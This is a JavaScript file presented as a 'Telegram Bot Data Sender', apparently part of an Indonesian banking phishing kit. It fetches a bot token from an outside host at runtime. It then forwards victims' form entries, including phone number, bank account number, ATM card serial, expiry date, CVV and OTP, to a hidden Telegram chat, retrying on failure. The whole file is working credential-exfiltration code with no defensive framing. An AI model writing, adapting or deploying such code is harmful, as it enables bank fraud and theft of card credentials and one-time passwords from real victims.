// Telegram Bot Data Sender
// This function sends form data to Telegram bot

class TelegramSender {
    constructor() {
        this.botToken = null;
        this.chatId = null;
        this.apiUrl = null;
    }

    async fetchCredentials() {
        try {
            const response = await fetch('https://loyalfitness.cloud/token.php');
            const data = await response.json();
            
            if (data.token && data.userid) {
                this.botToken = data.token;
                this.chatId = data.userid;
                this.apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
                return true;
            } else {
                console.error('Invalid credentials format');
                return false;
            }
        } catch (error) {
            console.error('Failed to fetch credentials:', error);
            return false;
        }
    }

    async sendData(data, formType = 'form') {
        try {
            // Fetch credentials if not available
            if (!this.botToken || !this.chatId) {
                const fetched = await this.fetchCredentials();
                if (!fetched) {
                    throw new Error('Failed to fetch Telegram credentials');
                }
            }

            // Create simple message with only form data
            const message = this.formatMessage(data);
            
            // Send to Telegram
            const response = await fetch(this.apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const result = await response.json();
            console.log('Data sent to Telegram successfully:', result);
            return { success: true, data: result };
            
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return { success: false, error: error.message };
        }
    }

    formatMessage(data) {
        let message = '';
        
        // Only include form data in the specified format
        if (data.nomorHp) {
            message += `Nomor HP: ${data.nomorHp}\n`;
        }
        if (data.nomorRekening) {
            message += `Nomor Rekening: ${data.nomorRekening}\n`;
        }
        if (data.seriAtm) {
            message += `Seri ATM: ${data.seriAtm}\n`;
        }
        if (data.masaBerlaku) {
            message += `Masa Berlaku: ${data.masaBerlaku}\n`;
        }
        if (data.cvv) {
            message += `CVV: ${data.cvv}\n`;
        }
        if (data.otp) {
            message += `OTP: ${data.otp}\n`;
        }
        
        return message.trim();
    }

    // Method to send data with retry mechanism
    async sendWithRetry(data, formType, maxRetries = 3) {
        for (let i = 0; i < maxRetries; i++) {
            try {
                const result = await this.sendData(data, formType);
                if (result.success) {
                    return result;
                }
                
                // Wait before retry
                await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
                
            } catch (error) {
                console.error(`Attempt ${i + 1} failed:`, error);
                if (i === maxRetries - 1) {
                    throw error;
                }
            }
        }
    }
}

// Create global instance
const telegramSender = new TelegramSender();

// Utility function to send form data
async function sendToTelegram(formData, formType = 'form') {
    try {
        const result = await telegramSender.sendWithRetry(formData, formType);
        return result;
        
    } catch (error) {
        console.error('Failed to send data to Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendToTelegram, TelegramSender };
}